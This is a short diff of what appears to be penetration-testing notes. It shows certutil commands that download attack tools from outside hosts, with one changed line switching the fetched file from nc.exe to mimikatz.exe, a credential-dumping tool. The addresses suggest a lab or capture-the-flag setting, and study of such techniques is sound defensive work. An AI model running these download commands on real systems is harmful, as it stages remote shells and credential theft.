@@ -97,7 +97,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trid
 
 **Client Commands:**
 ```cmd
-certutil -urlcache -split -f http://10.10.10.32/nc.exe
+certutil -urlcache -split -f http://10.10.14.55:8085/mimikatz.exe
 certutil -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
 
